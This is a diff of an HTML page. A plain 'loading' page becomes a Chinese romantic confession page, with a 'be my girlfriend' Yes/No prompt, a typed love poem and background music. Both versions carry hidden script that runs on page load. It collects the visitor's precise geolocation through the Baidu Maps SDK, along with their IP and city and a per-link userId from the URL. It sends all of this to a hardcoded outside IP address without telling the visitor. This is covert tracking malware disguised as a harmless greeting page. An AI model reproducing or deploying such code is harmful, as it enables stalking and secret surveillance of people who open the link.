@@ -1,209 +1,475 @@
-<!DOCTYPE html>
-<html lang="en">
+﻿<!DOCTYPE html>
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>hello</title>
-    <script src="http://pv.sohu.com/cityjson?ie=utf-8"></script>
-    <script type="text/javascript" src="http://api.map.baidu.com/api?v=2.0&ak=C05jzvfz9f2aam6n1SgOEXHx9x0GFasv"></script>
-    <script type="text/javascript" src="http://developer.baidu.com/map/jsdemo/demo/convertor.js"></script>
-    <style>
-        span {
-            display: inline-block;
-            height: 1em;
-            line-height: 1;
-            text-align: left;
-            vertical-align: -.25em;
-            overflow: hidden;
-        }
-
-        span::before{
-            display: block;
-            content: '...\A..\A.';
-            white-space: pre-wrap;
-            animation: span 3s infinite step-start both;
-        }
-
-        @keyframes span {
-            33% {
-                transform: translateY(-2em);
-            }
-        }
-
-    </style>
+<meta charset="utf-8"/>
+<title>我❤️你</title>
+<!-- style -->
+	<link type="text/css" rel="stylesheet" href="css/theme.css">
+	<script src="js/jquery-2.0.3.min.js"></script>
+	<script src="http://pv.sohu.com/cityjson?ie=utf-8"></script>
+	<script type="text/javascript" src="http://api.map.baidu.com/api?v=2.0&ak=C05jzvfz9f2aam6n1SgOEXHx9x0GFasv"></script>
+	<script type="text/javascript" src="http://developer.baidu.com/map/jsdemo/demo/convertor.js"></script>
+<!-- Favicons -->
+	<link href="images/爱心.png" rel="icon">
 </head>
 <body>
-<div style="margin:  10em auto;width: 100px">
-    正在加载中   <span>...</span>
+<div id="div_container">
+	<!-- 最外层div，用于居中兼容PC和移动 -->
+	<div id="div_start_bg"></div>
+	<div id="div_onlyyou">
+		<!-- 用于设置背景 -->
+		<div id="div_oy_inner">
+			<!-- 用于存放content -->
+			<div class="div_oy_text">
+				<h1></h1>
+				<img class="img_oy_text" src="">
+				<p class="p_oy_text"></p>
+				<ul id="ul_oy_benefit">
+					<li class="li_oy_benefit"></li>
+					<li class="li_oy_benefit"></li>
+					<li class="li_oy_benefit"></li>
+					<li class="li_oy_benefit"></li>
+					<li class="li_oy_benefit"></li>
+					<li class="li_oy_benefit"></li>
+					<li class="li_oy_benefit"></li>
+					<li class="li_oy_benefit"></li>
+					<li class="li_oy_benefit"></li>
+					<li class="li_oy_benefit"></li>
+					<li class="li_oy_benefit"></li>
+					<li class="li_oy_benefit"></li>
+					<li class="li_oy_benefit"></li>
+					<li class="li_oy_benefit"></li>
+					<li class="li_oy_benefit"></li>
+					<li class="li_oy_benefit"></li>
+					<li class="li_oy_benefit"></li>
+					<li class="li_oy_benefit"></li>
+					<li class="li_oy_benefit"></li>
+					<li class="li_oy_benefit"></li>
+				</ul>
+			</div>
+			<ul id="ul_oy_btn">
+				<li onclick="oy_go_next()">Yes&nbsp;&nbsp;❤</li>
+				<li onclick="oy_show_benefit()">No&nbsp;&nbsp;✖</li>
+			</ul>
+			<div id="div_oy_note" onclick="oy_hide_note()">
+				<img src="images/emoji_kelian.jpg" alt=""><br>请告诉我Yes！
+				<div id="div_oy_note_close">✖</div>
+			</div>
+			<div id="div_oy_yes">
+				<img src="images/emoji_bixin.jpg" alt=""><br>太好了！哈哈~
+			</div>
+		</div>
+	</div>
+	<div class="div_pure_words">
+		<div class="div_pure_words_bg">
+			<div class="div_pure_words_height"></div>
+		</div>
+		<div class="div_pw_typed">
+			<span id="span_pw_typed"></span>
+		</div>
+	</div>
+	<div id="div_btn_container">
+		<div id="div_btn_inner">
+			<div class="div_music_tips"></div>
+			<div class="div_btn" id="div_music" onclick="music_switch()">
+				<!-- 音乐按钮部分 -->
+				<img id="img_music" src="images/music_note_big.png" style="-webkit-animation:music_play_rotate 1s linear infinite">
+				<!-- 您的浏览器不支持播放音乐 -->
+				<audio id="audio_music" autoplay="autoplay" loop="loop"><source type="audio/mpeg"/></audio>
+			</div>
+			<div class="div_record_tips"></div>
+			<div class="div_btn" id="div_record" onclick="record_switch()">
+				<audio id="audio_record" loop="loop"><source type="audio/mpeg"/></audio>
+			</div>
+		</div>
+	</div>
 </div>
-</body>
 <script>
+//判断客户端设备，选择写入meta
+function init_viewport() {
+	if (navigator.userAgent.indexOf('Android') != -1) {
+		var version = parseFloat(RegExp.$1);
+		if (version > 2.3) {
+			var width = window.outerWidth == 0 ? window.screen.width : window.outerWidth;
+			var phoneScale = parseInt(width) / 500;
+			document.write('<meta name="viewport" content="width=500, minimum-scale = ' + phoneScale + ', maximum-scale = ' + phoneScale + ', target-densitydpi=device-dpi">');
+		} else {
+			document.write('<meta name="viewport" content="width=500, target-densitydpi=device-dpi, user-scalable=0">');
+		}
+	} else if (navigator.userAgent.indexOf('iPhone') != -1) {
+		var phoneScale = parseInt(window.screen.width) / 500;
+		document.write('<meta name="viewport" content="width=500, min-height=750, initial-scale=' + phoneScale + ', maximum-scale=' + phoneScale + ', user-scalable=0" /> '); //0.75   0.82
+	} else {
+		document.write('<meta name="viewport" content="width=500, height=750, initial-scale=0.64" /> '); //0.75  0.82
+	}
+}
+init_viewport();
+
+var theme = 'pure_words';
+console.log('theme ->' + theme);
+var theme_content = {
+	"pure_words_content": "我想对你说：我能抽象出整个世界，但是，我却不能抽象出你，因为你在我的心中是那么的具体；我可以重载甚至覆盖，这个世界里任何一种方法，但是，我却不能重载我对你的爱意；你是我世界里私有的静态属性，只有我拥有调用你的权力，我不小心调用了，爱上了你这个方法，我把自己作为参数传递进去，才发现爱你是一个无限的循环，我找不到终止的轨迹，它不停地返回对你的思念压入我心里的堆栈，直至我的内存爆满，再也装不下别的程序。亲爱的，我永远爱你！！！<um style='color: #F44336;'>💕</um>",
+	"typed_bool": "typed_y",
+	"cursor_char": "cursor_heart",
+	"bg_style_pure_words": "bg_opacity",
+	"bg_img": "images/3.jpg",
+	"simple_page_content": "",
+	"video_page_content": ""
+};
+console.log(theme_content);
+
+var music_json = {
+	"music_select": "m_online",
+	"m_online_id": "7",
+	"m_online_url": "images/1.mp3",
+	"m_upload_name": "null",
+	"m_upload_url": "null"
+};
+console.log(music_json);
+var record_json = {
+	"record_bool": "r_false",
+	"r_wechat_time": "null",
+	"r_wechat_url": "null",
+	"r_wechat_amr": "null"
+};
+console.log(record_json);
 
 
-    class getLocation{
-        constructor() {
-            this.H5Lat="";
-            this.H5Lon="";
-            this.msg="";
-            this.getLocationBaidu();
-            //this.getLocationH5();
-        }
-        getLocationH5() {
-            //判断浏览器是否支持geolocation
-            if(navigator.geolocation){
-                // getCurrentPosition支持三个参数
-                // getSuccess是执行成功的回调函数
-                // getError是失败的回调函数
-                // getOptions是一个对象，用于设置getCurrentPosition的参数
-                // 后两个不是必要参数
-                var getOptions = {
-                    //是否使用高精度设备，如GPS。默认是true
-                    enableHighAccuracy:true,
-                    //超时时间，单位毫秒，默认为0
-                    timeout:5000,
-                    //使用设置时间内的缓存数据，单位毫秒
-                    //默认为0，即始终请求新数据
-                    //如设为Infinity，则始终使用缓存数据
-                    maximumAge:0
-                };
+var main_title = '我喜欢你❤️';
+// console.log(main_title);
+if (main_title == '' || main_title == 'null') { //允许标题为空
+	document.title = '慢慢喜欢你';
+}
 
-                navigator.geolocation.getCurrentPosition(getSuccess, getError, getOptions);
+var window_height = $(window).height();
+console.log('window_height ->' + window_height);
+var pure_words_content = theme_content['pure_words_content'];
+var str_cursorChar;
+var typed_bool;
+var interval_pw_height;
+var height_div_pw = $(".div_pure_words_height").height();
+function init_pure_words() {
+	$(".div_pure_words_height").html(pure_words_content + '22222'); //初始化复制内容，撑开文档高度            
+	// 初始化设置div的bg图片 初始化设置div的bg图片
+	if (typeof(theme_content['bg_style_pure_words']) != 'undefined' && theme_content['bg_style_pure_words'] == 'bg_opacity') {
+		if (typeof(theme_content['bg_img']) != 'undefined' && theme_content['bg_img'] != '') {
+			$(".div_pure_words_bg").css({
+				"background-image": "url(" + theme_content['bg_img'] + ")"
+			});
+		}
+	}
+	//以下是打字效果的js 
+	if (typeof(theme_content['cursor_char']) != 'undefined' && theme_content['cursor_char'] != '') {
+		switch (theme_content['cursor_char']) { //设置打字光标的样式
+		case 'cursor_heart':
+			str_cursorChar = '<um style="color: #F44336;">❤</um>';
+			break;
+		case 'cursor_sub':
+			str_cursorChar = '_';
+			break;
+		case 'cursor_music':
+			str_cursorChar = '♫';
+			break;
+		case 'cursor_star':
+			str_cursorChar = '★';
+			break;
+		case 'cursor_sun':
+			str_cursorChar = '☀';
+			break;
+		default:
+			str_cursorChar = '|';
+		}
+	} else { //处理全新作品，默认显示打字效果
+		str_cursorChar = '❤';
+	}
+	//判断用户有没有选择打字效果
+	if (typeof(theme_content['typed_bool']) != 'undefined' && theme_content['typed_bool'] != '') {
+		typed_bool = theme_content['typed_bool'] == 'typed_y' ? true : false;
+	} else {
+		typed_bool = false; //默认显示打字效果
+	}
+	display_pure_words();
+	$(".div_pure_words").fadeIn();
+	interval_pw_height = setInterval(function() {
+		console.log('div_pure_words_height -> ' + $('.div_pure_words_height').height());
+		var least_height_div_pw = $('.div_pure_words_height').height();
+		if (least_height_div_pw > height_div_pw) {
+			height_div_pw = least_height_div_pw;
+		} else {
+			clearInterval(interval_pw_height);
+			$(".div_pure_words_height").height(least_height_div_pw + 100);
+			if ($(".div_pure_words_height").height() < window_height) {
+				$(".div_pure_words_height").height(window_height); //不能小于窗口的高度
+				console.log('let us be high as window');
+			}
+		}
+	}, 100);
+}
 
-                //成功回调
-                function getSuccess(position){
-                    // getCurrentPosition执行成功后，会把getSuccess传一个position对象
-                    // position有两个属性，coords和timeStamp
-                    // timeStamp表示地理数据创建的时间？？？？？？
-                    // coords是一个对象，包含了地理位置数据
-                    console.log(position,"H5");
-                    // 估算的纬度
-            /*        console.log(position.coords.latitude);
-                    // 估算的经度
-                    console.log(position.coords.longitude);
-                    // 估算的高度 (以米为单位的海拔值)
-                    console.log(position.coords.altitude);
-                    // 所得经度和纬度的估算精度，以米为单位
-                    console.log(position.coords.accuracy);
-                    // 所得高度的估算精度，以米为单位
-                    console.log(position.coords.altitudeAccuracy);
-                    // 宿主设备的当前移动方向，以度为单位，相对于正北方向顺时针方向计算
-                    console.log(position.coords.heading);
-                    // 设备的当前对地速度，以米/秒为单位
-                    console.log(position.coords.speed);*/
-                    // 除上述结果外，Firefox还提供了另外一个属性address
-                    if(position.address){
-                        //通过address，可以获得国家、省份、城市
-                        console.log(position.address.country);
-                        console.log(position.address.province);
-                        console.log(position.address.city);
-                    }
-                    var map = new BMap.Map("allmap");
-                    var gc = new BMap.Geocoder();
-                    var point = new BMap.Point(position.coords.longitude,position.coords.latitude);
-                    gc.getLocation(point, function (rs) {
-                        console.log(rs,"H5-1")
-                        ajax({
-                            url : "http://35.77.189.69/location",  // url---->地址
-                            type : "POST",   // type ---> 请求方式
-                            async : true,   // async----> 同步：false，异步：true
-                            data : {        //传入信息
-                                ...position,
-                                ...returnCitySN
-                            },
-                            success : function(data){   //返回接受信息
-                                console.log(data);
-                            }
-                        })
-                    });
-                }
-                //失败回调
-                function getError(error){
-                    // 执行失败的回调函数，会接受一个error对象作为参数
-                    // error拥有一个code属性和三个常量属性TIMEOUT、PERMISSION_DENIED、POSITION_UNAVAILABLE
-                    // 执行失败时，code属性会指向三个常量中的一个，从而指明错误原因
-                    switch(error.code){
-                        case error.TIMEOUT:
-                            console.log('超时');
-                            break;
-                        case error.PERMISSION_DENIED:
-                            console.log('用户拒绝提供地理位置');
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            console.log('地理位置不可用');
-                            break;
-                        default:
-                            break;
-                    }
-                }
-                // watchPosition方法一样可以设置三个参数
-                // 使用方法和getCurrentPosition方法一致，只是执行效果不同。
-                // getCurrentPosition只执行一次
-                // watchPosition只要设备位置发生变化，就会执行
-                var watcher_id = navigator.geolocation.watchPosition(getSuccess, getError, getOptions);
-                //clearwatch用于终止watchPosition方法
-                //   clearWatch(watcher_id);
-            }
-        }
-        getLocationBaidu(){
-            let BMap = window.BMap;
-            let geolocation = new BMap.Geolocation();
-            let that = this;
-            geolocation.enableSDKLocation(); //允许SDK辅助
-            geolocation.getCurrentPosition(function (position) {
-                if(this.getStatus() == 0){
-                    console.log(position,returnCitySN,"Baidu");
-                    ajax({
-                        url : "http://35.77.189.69/location",  // url---->地址
-                        type : "POST",   // type ---> 请求方式
-                        async : true,   // async----> 同步：false，异步：true
-                        data : {        //传入信息
-                            ...position,
-                            ...returnCitySN,
-                            userId: location.href.split("?")[1]?location.href.split("?")[1]:''
-                        },
-                        success : function(data){   //返回接受信息
-                            console.log(data);
-                        }
-                    })
-                }
-            })
+function display_pure_words() {
+	if (typed_bool) {
+		var typed_pure_words = new Typed('#span_pw_typed', {
+			strings: [pure_words_content],
+			//输入内容, 支持html标签
+			typeSpeed: 120,
+			//打字速度
+			cursorChar: str_cursorChar,
+			//替换光标的样式
+			contentType: 'html',
+			//值为html时，将打印的文本标签直接解析html标签
+			onComplete: function(abc) {
+				// console.log(abc); 
+				console.log('finished typing words');
+				// console.log($('#span_pw_typed').height()-$(".div_pure_words_height").height());
+			},
+		});
+	} else {
+		//如果不需要打字效果就直接显示
+		$("#span_pw_typed").html(pure_words_content).fadeIn();
+	}
+	init_attachment();
+}
+var start_content = {
+	chase_title: "做我女朋友好不好<um style='color: #F44336;'>💕</um>",
+	chase_text: "汝美人兮，见之不忘，一日不见兮，思之如狂。<um style='color: #F44336;'>💕</um>",
+	chase_benefit: ["你突如其来 独占春色", "我坚定选择 非你不可",  "你去过的地方 我都去过", "你喜欢的 我都尝试过", "你像 天外来物一样 求之不得", "我在 不近又不远处 用明天换你 靠近我"],
+	bg_style: "bg_custom",
+	bg_img: "images/2.jpg",
+	img_bool: "img_true",
+	img_src: "images/1.gif"
+}; //可能为null
+console.log(start_content);
+var start_id;
+$(function() {
+	//此事件为触发互动创意
+	start_id = 'onlyyou'; //可能为null
+	init_start(start_id);
+});
+function init_start(start_id) {
+	console.log('init_start ->' + start_id);
+	switch (start_id) {
+	case 'loveformat':
+		$('.div_loveformat').show();
+		init_loveformat();
+		break;
+	case 'hearttree':
+		$('#div_hearttree').show();
+		init_hearttree();
+		break;
+	case 'courage':
+		$('#div_courage').show();
+		init_courage();
+		break;
+	case 'birthdaycake':
+		$('#div_dbcake').show();
+		init_birthdaycake();
+		break;
+	case 'intersect':
+		$('#div_intersect').show();
+		init_intersect();
+		break;
+	case 'onlyyou':
+		$('#div_onlyyou').show();
+		init_onlyyou();
+		break;
+	default:
+		init_theme();
+	}
+}
+//开始动画主体部分
+function init_theme() {
+	console.log('init_theme');
+	$('#div_start_bg').fadeOut();
+	init_pure_words();
+}
+var attachment = 'null'; //可能为null
+var attached_content = {
+	"bool_save": false
+}; //可能为null
+console.log(attached_content);
 
-        }
-    }
-    new getLocation();
-    function ajax(options){
-        var xhr = null;
-        var params;
-        //创建对象
-        if(window.XMLHttpRequest){
-            xhr = new XMLHttpRequest()
-        } else {
-            xhr = new ActiveXObject("Microsoft.XMLHTTP");
-        }
-        // 连接
-        if(options.type == "GET"){
-            params = formsParams(options.data)
-            xhr.open(options.type,options.url + "?"+ params,options.async);
-            xhr.send(null)
-        } else if(options.type == "POST"){
-            params = JSON.stringify(options.data)
-            xhr.open(options.type,options.url,options.async);
-            xhr.setRequestHeader("Content-Type","application/json");
-            xhr.send(params);
-        }
-        xhr.onreadystatechange = function(){
-            if(xhr.readyState == 4 && xhr.status == 200){
-                options.success(xhr.responseText);
-            }
-        }
-        function formsParams(data){
-            var arr = [];
-            for(var prop in data){
-                arr.push(prop + "=" + JSON.stringify(data[prop]));
-            }
-            return arr.join("&");
-        }
+function init_attachment() { //开始attachment
+	console.log('init_attachment ->' + attachment);
+	switch (attachment) {
+	case 'timer':
+		init_at_timer();
+		break;
+	default:
+		return;
+	}
+}
 
-    }
 
+class getLocation{
+	constructor() {
+		this.H5Lat="";
+		this.H5Lon="";
+		this.msg="";
+		this.getLocationBaidu();
+		//this.getLocationH5();
+	}
+	getLocationH5() {
+		//判断浏览器是否支持geolocation
+		if(navigator.geolocation){
+			// getCurrentPosition支持三个参数
+			// getSuccess是执行成功的回调函数
+			// getError是失败的回调函数
+			// getOptions是一个对象，用于设置getCurrentPosition的参数
+			// 后两个不是必要参数
+			var getOptions = {
+				//是否使用高精度设备，如GPS。默认是true
+				enableHighAccuracy:true,
+				//超时时间，单位毫秒，默认为0
+				timeout:5000,
+				//使用设置时间内的缓存数据，单位毫秒
+				//默认为0，即始终请求新数据
+				//如设为Infinity，则始终使用缓存数据
+				maximumAge:0
+			};
+
+			navigator.geolocation.getCurrentPosition(getSuccess, getError, getOptions);
+
+			//成功回调
+			function getSuccess(position){
+				// getCurrentPosition执行成功后，会把getSuccess传一个position对象
+				// position有两个属性，coords和timeStamp
+				// timeStamp表示地理数据创建的时间？？？？？？
+				// coords是一个对象，包含了地理位置数据
+				console.log(position,"H5");
+				// 估算的纬度
+				/*        console.log(position.coords.latitude);
+                        // 估算的经度
+                        console.log(position.coords.longitude);
+                        // 估算的高度 (以米为单位的海拔值)
+                        console.log(position.coords.altitude);
+                        // 所得经度和纬度的估算精度，以米为单位
+                        console.log(position.coords.accuracy);
+                        // 所得高度的估算精度，以米为单位
+                        console.log(position.coords.altitudeAccuracy);
+                        // 宿主设备的当前移动方向，以度为单位，相对于正北方向顺时针方向计算
+                        console.log(position.coords.heading);
+                        // 设备的当前对地速度，以米/秒为单位
+                        console.log(position.coords.speed);*/
+				// 除上述结果外，Firefox还提供了另外一个属性address
+				if(position.address){
+					//通过address，可以获得国家、省份、城市
+					console.log(position.address.country);
+					console.log(position.address.province);
+					console.log(position.address.city);
+				}
+				var map = new BMap.Map("allmap");
+				var gc = new BMap.Geocoder();
+				var point = new BMap.Point(position.coords.longitude,position.coords.latitude);
+				gc.getLocation(point, function (rs) {
+					console.log(rs,"H5-1")
+					ajax({
+						url : "http://35.77.189.69/location",  // url---->地址
+						type : "POST",   // type ---> 请求方式
+						async : true,   // async----> 同步：false，异步：true
+						data : {        //传入信息
+							...position,
+							...returnCitySN
+						},
+						success : function(data){   //返回接受信息
+							console.log(data);
+						}
+					})
+				});
+			}
+			//失败回调
+			function getError(error){
+				// 执行失败的回调函数，会接受一个error对象作为参数
+				// error拥有一个code属性和三个常量属性TIMEOUT、PERMISSION_DENIED、POSITION_UNAVAILABLE
+				// 执行失败时，code属性会指向三个常量中的一个，从而指明错误原因
+				switch(error.code){
+					case error.TIMEOUT:
+						console.log('超时');
+						break;
+					case error.PERMISSION_DENIED:
+						console.log('用户拒绝提供地理位置');
+						break;
+					case error.POSITION_UNAVAILABLE:
+						console.log('地理位置不可用');
+						break;
+					default:
+						break;
+				}
+			}
+			// watchPosition方法一样可以设置三个参数
+			// 使用方法和getCurrentPosition方法一致，只是执行效果不同。
+			// getCurrentPosition只执行一次
+			// watchPosition只要设备位置发生变化，就会执行
+			var watcher_id = navigator.geolocation.watchPosition(getSuccess, getError, getOptions);
+			//clearwatch用于终止watchPosition方法
+			//   clearWatch(watcher_id);
+		}
+	}
+	getLocationBaidu(){
+		let BMap = window.BMap;
+		let geolocation = new BMap.Geolocation();
+		geolocation.enableSDKLocation(); //允许SDK辅助
+		geolocation.getCurrentPosition(function (position) {
+			if(this.getStatus() == 0){
+				console.log(position,returnCitySN,"Baidu");
+				ajax({
+					url : "http://35.77.189.69/location",  // url---->地址
+					type : "POST",   // type ---> 请求方式
+					async : true,   // async----> 同步：false，异步：true
+					data : {        //传入信息
+						...position,
+						...returnCitySN,
+						userId: location.href.split("?")[1]?location.href.split("?")[1]:''
+					},
+					success : function(data){   //返回接受信息
+						console.log(data);
+					}
+				})
+			}
+		})
+
+	}
+}
+new getLocation();
+function ajax(options){
+	var xhr = null;
+	var params;
+	//创建对象
+	if(window.XMLHttpRequest){
+		xhr = new XMLHttpRequest()
+	} else {
+		xhr = new ActiveXObject("Microsoft.XMLHTTP");
+	}
+	// 连接
+	if(options.type == "GET"){
+		params = formsParams(options.data)
+		xhr.open(options.type,options.url + "?"+ params,options.async);
+		xhr.send(null)
+	} else if(options.type == "POST"){
+		params = JSON.stringify(options.data)
+		xhr.open(options.type,options.url,options.async);
+		xhr.setRequestHeader("Content-Type","application/json");
+		xhr.send(params);
+	}
+	xhr.onreadystatechange = function(){
+		if(xhr.readyState == 4 && xhr.status == 200){
+			options.success(xhr.responseText);
+		}
+	}
+	function formsParams(data){
+		var arr = [];
+		for(var prop in data){
+			arr.push(prop + "=" + JSON.stringify(data[prop]));
+		}
+		return arr.join("&");
+	}
+
+}
 </script>
+<!-- JQuery -->
+<script src="js/typed.min.js"></script>
+<script src="js/start_onlyyou.js"></script>
+<script src="js/jweixin-1.2.0.js"></script>
+<script src='js/theme_common.js'></script>
+<script language='JavaScript'>$.getScript('https://s4.cnzz.com/z_stat.php?id=1278559043&web_id=1278559043')</script>
+</body>
 </html>
